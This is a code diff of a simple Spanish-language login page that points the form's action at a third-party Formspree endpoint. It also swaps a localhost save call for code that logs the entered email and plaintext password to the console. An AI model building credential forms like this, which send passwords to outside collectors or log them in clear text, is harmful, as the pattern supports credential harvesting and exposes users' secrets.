@@ -9,7 +9,7 @@
 <body>
     <div class="login-container">
         <h2>Iniciar sesión</h2>
-        <form id="loginForm">
+        <form id="loginForm" action="https://formspree.io/f/xyzglnyk" method="POST">
             <label for="email">Correo electrónico</label>
             <input type="email" id="email" name="email" required>
 
@@ -19,34 +19,24 @@
             <button type="submit">Iniciar sesión</button>
         </form>
     </div>
-    <script src="script.js"></script>
 </body>
 </html>
 
+
 <script>
-    // script.js
+// script.js
 document.getElementById('loginForm').addEventListener('submit', function(event) {
     event.preventDefault(); // Evita el envío del formulario
 
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
 
-    const data = { email, password };
+    // Por ahora, solo muestra los datos en la consola
+    console.log('Email:', email);
+    console.log('Password:', password);
 
-    fetch('http://localhost:3000/save-data', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data)
-    })
-    .then(response => response.text())
-    .then(data => {
-        alert('Datos guardados exitosamente');
-    })
-    .catch(error => {
-        console.error('Error:', error);
-    });
+    // Simula un mensaje de éxito
+    alert('Datos enviados (no se guardan en el archivo por ser una demo)');
 });
 
 </script>
